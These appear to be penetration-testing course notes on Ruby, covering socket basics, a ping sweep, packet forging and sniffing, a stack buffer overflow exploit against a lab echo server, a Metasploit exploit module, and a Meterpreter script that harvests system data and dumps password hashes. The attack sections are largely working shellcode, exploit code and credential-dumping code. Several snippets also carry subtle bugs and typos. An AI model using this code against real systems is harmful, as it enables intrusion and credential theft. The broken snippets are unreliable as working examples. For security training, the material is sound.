Equivalent to:
`TCPSocket.open("165.193.126.229",37){|s| Time.at(s.gets.unpack('N')[0]-2208988800)}`, => `2014-01-30 11:48:34 +0100`.
Ruby is a very powerful language. With the previous one line of code, you can open a TCP connection, receive and then decode information.

We can also obtain information about the connection.
The `addr` method can be used to obtain information about the local part of the stream. It returns the local address as an array which contains address family, port, hostname, and numeric address.
```ruby
TCPSocket.open("165.193.126.229",37)
s.addr # ["AF_INET", 55888, "10.0.2.15", "10.0.2.15"]
```
Since we have used `open` without specifying a local port, the system randomly uses a random one (i.e. `55888`).

On the other side, `peeraddr` is used to obtain the same information about the remote part of the stream.
```ruby
TCPSocket.open("165.193.126.229",37)
s.peeraddr # ["AF_INET", 37, "165.193.126.229", "165.193.126.229"]
```

The TIME service can use the UDP socket too. UDP protocol is different than TCP, UDP is a stateless and connectionless protocol. Therefore using `UDPSocket` in Ruby is a bit different when compared with `TCPSocket`.

```ruby
require 'socket'
s = UDPSocket.new
s.send("",0,"165.193.126.229",37)
resp = s.recv(4) # "\xD6\x94\xDF8"
time = Time.at(resp.unpack('N')[0]-2208988800) # 2014-01-30 15:24:56 +0100
```

Note that the receive method (`rcv`) waits until some readable data are available in the socket.
Since UDP datagrams may be lost during the communication, if we use `rcv`, our script may freeze and wait indefinitely.

If you want to avoid this situation, you can use another method that does not wait for the response: `recv_nonblock`.
If no response is received it raises an exception, therefore you can rescue it and continue with the script execution.

Now, we are going to create a simple (but improved) client-server application that acts as a TIME server.
We will create a parametric TIME service where the type of response depends on the parameters received from the client.

In order to create a TCP server, Ruby provides the class `TCPServer`. The first thing to do is to bind the server to a specific port and address.

```ruby
def main(ip,port)
	# new TCP server bound to ip and port provided as argument
	server = TCPServer.new ip,port
	# loop indefinitely to accept clients requests
	loop do
	  # new request accepted (client is a socket)
	  client = server.accept
	  # prints the client information (IP and port)
	  print Time.new.to_s+" - IP: "+client.peeraddr[3]
	  print " Port: "+client.peeraddr[1].to_s+"\n"
	  # client socket receives a message from the client
	  # chop is used to delete the last character ("\n")
	  case client.gets.chop
	    # the server sends the correct answer according to the
	    # type of operation received (timestamp|utc|local)
	    when "timestamp" then client.puts(Time.now.to_i)
	    when "utc" then client.puts(Time.now.utc)
	    when "Local" then client.puts(Time.now)
	    else client.puts("Invalid operation")
	  end
	  # server is done => close the socket
	  client.close
	end
end
```

*Penetration Testing Activities*.

Ping sweep.

One of the most simple methods to check if an host is up, is by using ICMP echo request.
If the destination host is alive (and the ping is not filtered by a firewall), it will respond with a ICMP echo reply.
Using *ping sweep* you can send ICMP echo requests in an entire network and map the responding hosts as alive.

If you want to do an ICMP request with Ruby without using external utility, you must work with `Socket` class that provides access to the *underlying operating system socket implementations*.
You need to use it with a *low level* strategy, therefore you must know how an ICMP echo packet is made of and you have to forge the socket instance in a right (and low level) way.
Sometimes these kinds of operations may cause loss of time especially if you are not familiar with low level system knowledge.

There are a lot of gems that are designed to simplify these low level tasks. One of them is `net-ping`: a collection of classes that provide different ways to ping computers.

```ruby
require 'net/ping'
host = ARGV[0]
req = Net::Ping::ICMP.new(host)
if req.ping then puts host + " UP"
else puts host + " DOWN" end
```

Now, let us write a ping sweep script that finds all the alive hosts (using ICMP request) on a specific network.

The time can be a problem in our script. By default, `net-ping` sets the ICMP response timeout to 5 seconds. Therefore the time to scan a `/24` network can be (in the worst case) 254\*5 seconds, about 20 minutes.
The first strategy to improve the script is to use a lower timeout. For example, we could set it to 0.5 seconds or 1 second, according to the time necessary to reach the target network.

```ruby
require 'net/ping'
def main(network,timeout)
	timeout = timeout ? timeout : 1 
	(1..254).each do |i|
		req Net::Ping::ICMP.new(network+i.to_s,nil,timeout.to_f)
		puts network+i.to_s if req.ping
	end
end

begin
	main(ARGV[0],ARGV[1])
end
```
Note that `network` argument must be a string of type "xxx.xxx.xxx." (e.g. "192.168.1.") and `timeout` argument is a string that can be converted into a float.

Port scanning.

Another common penetration testing activity is *port scanning*: identifying open/filtered/closed ports (and alive hosts).
A port scan can be performed after the identification of an alive host or it can be used to verify if an host is alive (for example if there is a firewall that filters other scanning techniques such as ICMP ping).




*Raw Sockets*.



**OS Interaction**.




### PacketFu - Video

`pry --simple-prompt`:
```ruby
require 'packetfu'
include PacketFu

i = ICMPPacket.new(:config => Utils.whoami?)

i.ip_daddr = "<TargetIP>"
i.icmp_type = 8
i.icmp_code = 0
i.payload = "Some random data..."

i.recalc
i.to_w
```

`pry --simple-prompt`:
```ruby
require 'packetfu'
include PacketFu

t = TCPPacket.new(:coinfig => Utils.whoami?)

t.eth_daddr = Utils.arp("<TargetIP>")
t.ip_daddr = "<TargetIP>"
t.tcp_dport = 139
t.tcp_sport = 4500
t.tcp_flags.syn = 1

t.recalc
t.to_w

t.tcp_dport = 200

t.recalc
t.to_w
```

### PacketFu Sniffing - Video

1. ¿¿¿

`pry --simple-prompt`:
```ruby
require 'packetfu'
include PacketFu

cap = Capture.new(:iface => "eth0", :promisc => true)

cap.start
cap.save
cap.array.length

cap.array[0]
p = Packet.parse(cap.array[0])
p.class

p = Packet.parse(cap.array[5])
p.class
```

2. ¿¿¿

`featherpad /root/Desktop/sniff_tcp_udp.rb`:
```ruby
require 'packetfu'
include PacketFu

def sniff(iface)
	cap = Capture.new(:iface => iface, :promisc => true, :start => true)
	cap.stream.each do |p|
		pkt = Packet.parse p
		if pkt.is_tcp? || pkt.is_udp?
			packet_info = [pkt.ip_saddr, pkt.ip_daddr, pkt.proto.last]
			print "%-15s -> %-15s %s " % packet_info
			packet_info = [pkt.tcp_udp, pkt.tcp_dport] if pkt.is_tcp?
			packet_info = [pkt.udp_udp, pkt.udp_dport] if pkt.is_udp?
			print "%-5s -> %-5s" % packet_info
			puts
		end
	end
end

sniff(ARGV[0])
```

`featherpad /root/Desktop/sniff_http.rb`:
```ruby
require 'packetfu'
include PacketFu

def sniff(iface)
	cap = Capture.new(:iface => iface, :promisc => true, :start => true, :filter => 'tcp dst port http')
	cap.stream.each do |p|
		pkt = Packet.parse p
		if pkt.payload =~ /GET\s([^\s]*)\s/
			path = $1
			packet_info = [pkt.ip_saddr, pkt.ip_daddr]
			print "%-15s -> %-15s :" % packet_info
			pkt.payload =~ /Host:\s([^\s]*)\s/
			hostname = $1
			print hostname, path, "\n"
		end
	end
end

sniff(ARGV[0])
```

---

## The Web

### The Web - Study Guide





---

## Exploitation with Ruby

### Exploitation with Ruby - Study Guide

**Vulnerability Analysis**.

We will show how to identify a buffer overflow vulnerability of a crafted server called "ELS Echo Server" and how to use Ruby to exploit the server.
"ELS Echo Server" is a simple echo server that sends back all the messages that it receives. Actually, it responds only to the first message because it closes the connection after the response.

Many of the common attacks require some bad programming, especially for the input data that a service may receive from the user.
In this case, ELS Echo Server has a common C++ programming bug. The size of the received data from the user is not checked causing a buffer overflow possibility.
```c++
int input_copy (char *myinput) {
	char buff_ov_variable[20];
	strcpy(buff_ov_variable, myinput);
	return 0;
}
```
The vulnerable instruction is `strcpy`. If the variable `myinput` contains more than 20 characters, a buffer overflow occurs.

This is how the stack looks like when the function `input_copy` is called:
|------------------|
|       ...        |
| buff_ov_variable |
|     old EBP      |
|  Return Address  |
|     myinput      |
|       ...        |
The size of `buff_ov_variable` is 20 bytes, therefore if we put in more than 20 bytes, we have a buffer overflow and we can overwrite the `Return Address`.


The most common technique to properly overwrite the `Return Address` is by using a `CALL ESP` instruction address (usually located in Kernel32.dll) and then put the malicious code after the local variables space.
This holds because `ESP` stores the top of the stack and when the `RET` is executed, the `input_copy` frame is erased and the top of the stack contains our malicious code executed next by the `CALL ESP`.
Therefore to correctly exploit the vulnerability, we have to detect where to insert the `CALL ESP` address and the malicious payload.

**Exploitation**.

Once we know the buffer overflow stack space, using Ruby to send the exploit will be very easy.

We do not know the correct position of the return address of the `input_copy` stack frame. It is required to craft the entire payload.

*Fuzzing* is an incremental technique to detect the correct position of the return address and it is mainly used when we cannot debug the vulnerable service. It is a common situation when you work with *closed source software*.
A fuzzer generally sends semi-random attack vectors to an application in an incremental way. This is used to discover how the stack looks. With some appropriate attempts, you can detect the correct position of the return address.

Obviously penetration testers and hackers use fuzzers only if they cannot debug the target application by themselves. If you have the service executable, you can use debuggers to detect the stack return address position on your own.

Since we own the source code and the executable of the "ELS Echo Server" too, we will show how to use *Immunity Debugger* in conjunction with some useful tools provided by the *Metasploit* framework.

Remember that in this type of attack, when we overwrite the stack memory locations, we overwrite the location that stores the function return address too. Therefore after the `RETN` value, the `EIP` register takes an address overwritten by our buffer overflow attack.
When we send a big string of "A" characters for example, we can see that the service crashes and `EIP` stores "AAAA".

To detect where the return address location is (*offset* from the vulnerable buffer), we can use two Metasploit tools: `pattern_create.rb` and `pattern_offset.rb` available in `/usr/share/metasploit-framework/tools/`.

Once we have the return address location (offset) in the stack, we know that our script payload must have some characters followed by a `CALL ESP` (or `JMP ESP`) instruction address.

Now we have everything we need to write our exploit. We will see how to use Ruby and Metasploit to write and send a payload that executes the calculator (`calc.exe`) on the target vulnerable machine. Then we will also see how to open a telnet shell on the victim.

Before putting the real malicious payload logic, remember that after the return address, there is space allocated for the arguments passed to call the function. It is not important to calculate the exact size of this space. The important thing is to insert enough `NOP` instructions before the real malicious payload.

This is how the stack looks like before `RETN`.
|-------------------|
|        ...        |
|    NOP,NOP,NOP    |
|        NOP        |
| CALL ESP address  |
|    NOP,NOP,NOP    |
|    NOP,NOP,NOP    |
| Malicious payload |
|        ...        |

### Exploitation with Ruby - Video

`./usr/share/metasploit-framework/tools/pattern_create.rb 100`:
```
Aa0AalAa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1AB2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A ←
```

`./usr/share/metasploit-framework/tools/pattern_offset.rb 35624134 100`:
```
[*] Exact match at offset 44 ←
```

`findjmp.exe Kernel32.dll ESP`:
```
Ox75218BD5		jmp ESP
Ox75224722		push ESP - ret
Ox752A2E2B		call ESP ←
```

`msfpayload windows/exec CMD=calc.exe R | msfencode -b "\x00" -t rb`:
```
buf =
"\xba\x83\x0b\x77\xfe\xdb\xca\xd9\x74\x24\xf4\x5d\x31\xc9"
"\x61\x33\x31\x55\x12\x83\xc5\x04\x03\xd6\x05\x95\x0b\x24"
"\xf1\xd0\xf4\xd4\x02\x83\x7d" # ... ←
```

`featherpad /root/Desktop/exploit.rb`:
```ruby
require 'socket'

ip, port = ARGV[0], ARGV[1]

preamble = "\x90"*44 # nops
return_address = "\x2b\x2e\x2a\x75" # CALL ESP instruction address (big-endian)
arguments_nop = "\x90"*10 # nops
calc_payload = 
"\xba\x83\x0b\x77\xfe\xdb\xca\xd9\x74\x24\xf4\x5d\x31\xc9" +
"\x61\x33\x31\x55\x12\x83\xc5\x04\x03\xd6\x05\x95\x0b\x24" +
"\xf1\xd0\xf4\xd4\x02\x83\x7d" # ...

exploit = preamble + return_address + arguments_nop + calc_payload

TCPSocket.open(ip, port){ |s| s.puts exploit }
```

`msfpayload windows/shell_bind_tcp LPORT=<TargetPort> R | msfencode -b "\x00" -t rb`:
```
buf =
"\xbd\xfd\x33\xf1\x2f\xd9\xf6\xd9\x74\x24\xf4\x5e\x2b\xc9"
"\xb1\x56\x31\x6e\x13\x03\x6e\x13\x83\xee\x01\xd1\x04\xd3"
"\x11\x9f\xe7\x2c\xe1\xc0\x6e" # ...
```

`telnet <TargetIP> <TargetPort>`.

---

## Metasploit

### Metasploit - Study Guide

We want to *automate* the exploitation phase. This avoids having to write a custom script (or a payload) each time we find an "ELS Echo Server". To do this, we have written a Metasploit module to automate the "ELS Echo Server" exploitation.

Metasploit is a very huge framework and we will not cover all of its features and functions. Rather, we will give you a starting point to learn how to use and *develop modules* in Metasploit.

**Metasploit Architecture and Framework**.

The following is the Metasploit framework architecture.
![Metasploit framework architecture](./image/msf_architecture.png).

The Metasploit framework has a modular structure. This structure allows the framework to be as flexible as possible in order to make possible code and functionality reuse.

In Kali OS, the Metasploit Framework directory is `/usr/share/metasploit-framework`. It contains all the Metasploit filesystem. We can identify the respective directories while the framework interfaces are the `msf*` commands.
Another useful directory is `~/.msf4/`. It is suitable for *local user modules and plugins*. Putting them here you will allow you to have them in the Metasploit framework too.

**Metasploit Interfaces**.

Metasploit *console* interface.

*msfconsole* interface is the most used one. It gives you a real console for the framework features, indeed it is a complex interface and a shell command too.

Metasploit *CLI* interface.

*msfcli* is a very useful command-line interface into the Metasploit framework. You can use it to launch exploits or handler quickly.
Example: `msfcli exploit/windows/els/echoserv RHOST=<TargetIP> E`.

`msfcli -h`:
```
Usage: /opt/metasploit/apps/pro/msf3/msfcli <exploit_name> <option=value> [mode]

Mode Description

(A)dvanced     Show available advanced options for this module
(AC)tions      Show available actions for this auxiliary module
(C)heck        Run the check routine of the selected module
(E)xecute      Execute the selected module

(H)elp         You're looking at it baby!

(I)DS Evasion  Show available ids evasion options for this module
(O)ptions      Show available options for this module

(P)ayloads     Show available payloads for this module

(S)ummary      Show information about this module

(T)argets      Show available targets for this exploit module
```

Metasploit *web* interface.

Metasploit has a web interface too. To use it in Kali Linux, the first thing to do is start the Metasploit service: `service metasploit start`.
You can build your own projects and perform the same things you can do with msfconsole.
For some users (especially beginners), the web interface is a better starting point to use the Metasploit framework.

There are some other interfaces to the Metasploit framework. You already know some of them (e.g. *msfpayload* and *msfencode*).

**Metasploit Libraries**.

We can find all of the libraries used by the Metasploit framework in the `lib` directory of the Metasploit file system.
The main libraries used by the Framework are: `Rex`, `Msf::Core` and `Msf::Base`.

`Rex` library (*Ruby extension Library*) is probably one of the most important of the entire framework. It provides a collection of basic classes and modules useful for almost all of the framework tasks: protocols, sockets, services, encoders, text transformations and so on.

The `Core` library implements the set of classes and utilities that can be used as an interface to the framework modules and plugins. 
Using the core instance, you can manage modules, plugins, sessions, jobs and so on. The instance contains the entire framework state and you can create it using `framework = Msf:: Framework.new`.

`Base` library is the last of the three big libraries that build up the Metasploit framework. It is a library developed on top of the Core library and it makes easier to interact with the framework structure. Its purpose is to provide simplified and more user-friendly APIs to improve and speed up the development.

**Metasploit Modules**.

Modules are the part of the framework that the user uses to perform exploitations and penetration testing activities.

![Metasploit modules](./image/msf_modules.png).

*Exploits*.

Exploits modules are not used only to perform exploitations attacks. They are also used for other purposes such as executing arbitrary sets of code depending on a selected payload.
In order to avoid running two commands and multiple interfaces (one that starts the *handler* and one that *exploits* the server), we will see how to use Metasploit framework to parameterize the entire exploitation process.

*Auxiliary*.

Auxiliary modules are used to perform operations different from exploitation. They are generally used when there is no need of a payload or a target. Some common auxiliary modules perform *Denial of Service* (DOS) attacks while some other are used as *scanners*, *information collections* and so on.

*Payloads*.

Payloads are another type of module that are very common. You will always use a Payload module when you launch an exploit (remember that you usually do a `set PAYLOAD` command). They encapsulate the real *malicious code* that is going to be executed if the exploitation succeeds (the raw instructions that make it possible to take control of the target machine exploited).

There are three types of payloads:
- single
- stagers
- stages.

A *single payload* has all of the necessary raw code to perform a particular task. For example, a `bind_shell` is a single payload because it does not require additional code.
A meterpreter connection requires a stager and a staged payload. The *stager* is used to setup the connection between the target and the attacker machine. Once established, a *staged* payload is sent to the target victim and it is the real malicious raw code.

*Nops*.

Generally nops modules are used to generate instructions that have no effect on the target machine. A typical nop instruction is `\x90`. Sometimes, these type of nops are detected by antivirus, therefore Metasploit provides some nops generator modules that you can use to generate more sophisticated nops.

*Encoders*.

Encoders are another type of module used to improve your payload generation in order to make them undetectable from antiviruses.

*Post*.

The last type of module offered by Metasploit framework is post. From their name, you can assume they are used to perform *post exploitation* tasks and therefore they may require an active meterpreter session to interact with as an option.
The framework allows to use them with the `run` command.

**Metasploit Plugins**.

Plugins are used to *extend framework capabilities*.
They provide an easy way to augment the framework features and commands and often they are developed to provide a *bridge* between the Metasploit framework and *other penetration testing tools*.

**Metasploit Tools**.

Metasploit tools are particular scripts that mainly use the Ruby Extension Library to perform some tasks that do not require any framework interaction or structure.

**Metasploit Write Custom Modules**.

The first thing to do in writing a Metasploit module is to identify the module type. In this case, the module that we are going to develop is an exploitation module.
This consideration is very important because it tells us where the real Ruby file module must be stored in order to make it recognizable by the framework.

Where do we put the module? In Kali, we have two options:
- in the framework file system `/usr/share/metasploit-framework/modules/exploits/windows`
- in the directory reserved to the private user modules and plugins: `~/.msf4/modules/exploits/windows/`.
Using the reserved directory is better. This choice avoids any problems related to the framework updates and upgrades (for example the overwrite of your custom or modified modules).

Adding the module script in the right path is not enough. The script must follow the Metasploit framework module structure (based on the type of the module) in order to be recognizable.

```ruby
require 'msf/core'

# Module Type
class Metasploit4 < Msf::Exploit::Remote

	# Module Requirements
	include Exploit::Remote::Tcp

	# Module Information
	def initialize(info = {})
		super(update_info(info,
				#---------------------
			)
		)
	end

	# Module Operations
	def check
		#---------------------
	end

	def exploit
		#---------------------
	end
end
```

The `msaf/core` library is almost always required for Metasploit modules.
Since our module will try to exploit a vulnerability against targets other than the local machine, we need to extend the
`Msf::Exploit::Remote` class. The keyword `Metasploit4` as a class name is required.

Since the connection that we want to establish with the vulnerable target service is a TCP connection, we need to specialize the custom module with the right methods (and options) suitable for TCP.
It is the time to use the mixin Ruby feature. Therefore, we have to include the specialized class `Exploit::Remote::Tcp` in the `Metasploit4` class.

Now that all of the classes and the libraries have been included, we can build the module body. The first thing to do is `initialize` the module with the information related to the module itself.

```ruby
def initialize(info = {})
	super(update_info(info,
			'Name'				=> 'ELS ECHO Server',
			'Description'		=> %q{
				This module exploits a buffer overflow
				found in the Els ECHO Server.
			},
			'Author'			=> ['eLearnSecurity'],
			'License'			=> MSF_LICENSE,
			'DefaultOptions'	=> {
				'EXITFUNC'	=> 'process',
				'RPORT'		=> '7707'
			},
			'Payload'			=> {
				'BadChars'	=> "\x00",
			},
			'Platform'			=> 'win',
			'Targets'			=> [
				['Windows XP SP3', { 'Ret' => 0x7C868667 }],
				['Windows 7', { 'Ret' => 0x772A2E2B }]
			],
			'DefaultTarget'  => 0
		)
	)
end
```

Now that our module has enough information, let us show how to implement the `check` framework command. It is used to verify if the target is exploitable and it is not a mandatory command (it is not so used by penetration testers).
But what is the logic behind the `check` command? To identify if "ELS Echo Server" is vulnerable, we can simply test its *banner*. The first message the server sends to the client is its banner "ELS Echo Server 1.1.".

```ruby
def check
	connect
	banner = sock.gets()
	disconnect

	if (banner =~ /ELS Echo Server 1.1/)
		return Exploit::CheckCode::Vulnerable
	end
	return Exploit::CheckCode::Safe
end
```

`exploit` is the last method implemented in our module. As you can imagine, it wraps the real *exploitation logic code*. Note that it uses the parameters and options specified through the framework.

The `exploit` command corresponds to the exploit method in our module class.
What is the logic behind it? It is really simple. We have seen in the previous chapters how to exploit the "ELS Echo Server" through Ruby. Now we have to do the same thing using methods, options and parameters provided by the Metasploit framework.

`target` and `payload` are two attributes provided by the `Msf::Exploit::Remote` class.
With the `target` attribute, you can get the selected target fields. In our example, the target is Windows XP SP3 and with `target.ret`, we have the return address specified in the initialize method.
The `pack('V')` method is used to convert the return address (`target.ret`) into a binary sequence (32-bit little endian).
Similar to target, `payload.encoded` stores the encoded payload. It takes into account the parameter set in the module configuration.

```ruby
def exploit
	connect
	print_status("Connected to #{datastore['RHOST']}:#{datastore['RPORT']}")

	handler

	print_status("Trying target #{target.name}")
	buff = "\x90"*44 + [target.ret].pack('V') + "\x90"*10 + payload.encoded
	sock.put(buff)
	disconnect
end
```

Now if the exploitation succeeds, we will obtain a meterpreter session. Remember that thanks to the handler, the stream is automatically opened.

Pay attention because we have deliberately used a non parametric strategy to setup the buffer. Moreover we have used the usual `NOP` instruction.
Metasploit Framework allows you to generate NOPs using the `make_nops` instruction.
Example: `make_nops(44)`.
The nops are not only `\x90` instruction, they are more sophisticated nops that avoid using the bad characters specified in the initialize constructor.

We can parameterize the buffer generation using some `Payload` parameters.
```ruby
'Payload'			=> {
	'Offset-1'	=> "44",
	'Offset-2'	=> "10",
	'BadChars'	=> "\x00"
}

...

buff = make_nops(payload_info['Offset-1']) + [target.ret].pack('V') +
	make_nops(payload_info['Offset-2']) + payload.encoded
```

We can also parameterize the buffer generation using `Target` parameters.
It is a common situation where different targets requires different offset or payload spaces to perform the exploitation.

You have probably noted that our module has two targets. The first has been used in all of our examples (Windows XP SP3). The second is a generic Windows 7.
Note that, if you test the module with an XP machine, all should work well while if you test the module with a different target OS (such as Windows 7), it will certainly fail.
This happens because Windows XP does not implement ASLR (Address space layout randomization) like Windows 7 does.

**Meterpreter Scripting**.

Meterpreter is one of the payloads available in the Metasploit Framework. It gives you a command line interface to execute different types of penetration testing activities such as data harvesting, pivoting and so on.

It is important to know that Meterpreter is a real framework that provides APIs with which to interact.
You can write your own scripts using Meterpreter APIs and you can use them in your penetration testing activities with the `run` command.

Default meterpreter scripts can be found at `/usr/share/metasploit-framework/scripts/meterpreter`. Some of the most known are hasdump, killav, migrate, scraper, autoroute and so on.
You can execute your own meterpreter scripts by putting them in your local Metasploit directory `.msf4/scripts/meterpreter/`.

### Meterpreter API - Video

We will see the most used Meterpreter APIs, and we will explore part of the Meterpreter source code to find the extensions and the methods that we can used in our scripts.
Some interesting APIs to see are the Windows Registry API and the Privilege Escalation API.

`irb` to open the Meterpreter IRB shell for interacting with the target host using Meterpreter objects and classes. Here we can use the `client` variable to interact with the Meterpreter session.

`client.session.host`: to see the target host IP address.
`client.session.port`: to see the target host port where the Meterpreter session is listening.
`client.info`: to see the computer name and the user name of the current user on the target machine.

The methods `fs`, `sys`, `net` allow us to use Meterpreter extensions that provide APIs to interact with the file system, the processes and the network.

We are going to explore the Ruby files in order to inspect and learn the Meterpreter Ruby classes, structures and methods.
`featherpad /usr/share/metasploit-framework/lib/rex/post/meterpreter/client.rb`.
`featherpad /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb`, `client.core.migrate(<PID>)`.
`featherpad /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/sniffer.rb`, `client.sniffer.interfaces`.
`featherpad /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb`, `client.fs.dir.pwd`, `client.fs.dir.chdir("../")`, `client.fs.dir.entries`.
`featherpad /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb`, `client.fs.file.search(client.fs.dir.pwd, "*.exe")`, `client.fs.file.stat("back1.exe")`.
`featherpad /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb`, `client.sys.config.getuid`, `client.sys.config.sysinfo`, `client.sys.config.getprivs`.
`featherpad /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb`, `client.sys.process.getuid`, `client.sys.process.processes`.
`featherpad /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/config.rb`, `client.net.get_interfaces`, `client.net.get_proxy_config`.

### Metasploit Write Custom Modules - Video

Writing Metasploit modules will help us to avoid writing custom scripts everytime we want to exploit a specific vulnerability. We will also be able to use different payloads and different targets. This is possible because the framework allows us to parameterize the entire exploitation phase and makes our penetration testing activities flexible and fast.

### Meterpreter Scripting - Video

We are going to see how to write a Meterpreter script starting from a script template provided by the Metasploit framework.

**Scraper** is a data harvesting tool that downloads system information including network shares, registry hives and password hashes. `run scraper`: to run it in a Meterpreter active session.
What we are going to write is a custom parametric scraper that takes as argument a list of options useful to specify what system information we want to download.

`cd /usr/share/doc/metasploit-framework/samples/scripts`, `mkdir -p ~/.msf4/scripts/meterpreter`, `cp meterpreter_script_template.rb ~/.msf4/scripts/meterpreter/custom_scraper.rb`.

```ruby
require 'fileutils'

#################### Variable Declarations ####################

@client = client
@logs_path
@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-s" => [ false, "System info"],
	"-n" => [ false, "Network info"],
	"-u" => [ false, "Users info"]
)
meter_type = client.platform
```

```ruby
################# Function Declarations #################

# Wrong Meterpreter Version Message Function
#-----------------------------------------------------------
def wrong_meter_version(meter = meter_type)
  print_error("#{meter} version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end

# Usage Message Function
#-----------------------------------------------------------
def usage
  print_line("Param-Scraper - parametric harvest system info, network info, and users info.")
  print_line("Info is stored in " + ::File.join(Msf::Config.log_directory, "scripts", "param-scraper")
  print_line("USAGE: run param-scraper <option list>")
  print_line(@exec_opts.usage)
  print_line("EXAMPLE: run param-scraper -s -n -u\n")
  raise Rex::Script::Completed
end

# Logs Directory Creation Function
#-----------------------------------------------------------
def create_logs_directory
	return if @logs_path
	host = client.session_host
	@logs_path = ::File.join(Msf::Config.log_directory, "scripts", "param-scraper", host + "_" + 
		Time.now.strftime("%Y%m%d.%M%S") + sprintf("%.5d", rand(100000)))
	::File.mkdir_p(@logs_path)
	print_line("#{@logs_path} directory created.")
end

# System Info Harvesting Function
#-----------------------------------------------------------
def sysinfo
	begin
		print_status("System information downloading...")
		create_logs_directory
		::File.open(::File.join(@logs_path, "sysinfo.txt"), "w") do |fd|
			fs.puts("------------- Meterpreter System Information -------------")
			fs.puts
			client.sys.config.sysinfo.each { |key, value| fd.puts "#{key}: #{{value}}" }
			fs.puts("\n------------- Windows System Information (systeminfo) -------------")
			fs.puts(m_exec(client, "systeminfo"))
		end
		print_good("System information downloading... -> DONE")
	rescue ::Exception => e
		print_error("System information downloading... - ERROR")
	end
end

# Network Info Harvesting Function
#-----------------------------------------------------------
def netinfo
	begin
		print_status("Network information downloading...")
		create_logs_directory
			::File.open(::File.join(@logs_path, "netinfo.txt"), "w") do |fd|
			fs.puts("------------- Meterpreter Network Interfaces Information -------------")
			client.net.config.each_interface { |i| fd.puts i.pretty }
			fs.puts("\n------------- Windows Routing Tables (netstat -rn) -------------")
			fs.puts(m_exec(client, "netstat -rn"))
			fs.puts("\n------------- Windows Connections and Listening Ports (netstat -an) -------------")
			fs.puts(m_exec(client, "netstat -an"))
		end
		print_good("Network information downloading... -> DONE")
	rescue ::Exception => e
		print_error("Network information downloading... - ERROR")
	end
end

# Users Info Harvesting Function
#-----------------------------------------------------------
def usersinfo
	begin
		print_status("Users information downloading...")
		create_logs_directory
		::File.open(::File.join(@logs_path, "usersinfo.txt"), "w") do |fd|
			fs.puts("\n------------- Windows Users (net user) -------------")
			fs.puts(m_exec(client, "net user"))
			fs.puts("\n------------- Windows Users Passwords Hashes -------------")
			client.core.use("priv")
			begin
				client.priv.sam_hashes.each { |h| fd.puts h }
			rescue ::Exception => e
				fd.puts("Error dumping hashes.")
				print_error("Error dumping hashes #{e}")
			end
		end
		print_good("Users information downloading... -> DONE")
	rescue ::Exception => e
		print_error("Users information downloading... - ERROR")
	end
end
```

```ruby
################ Main ################

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i # Remove none supported versions

@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-s"
		sysinfo
	when "-n"
		netinfo
	when "-u"
		usersinfo
	end
}
```

---
---
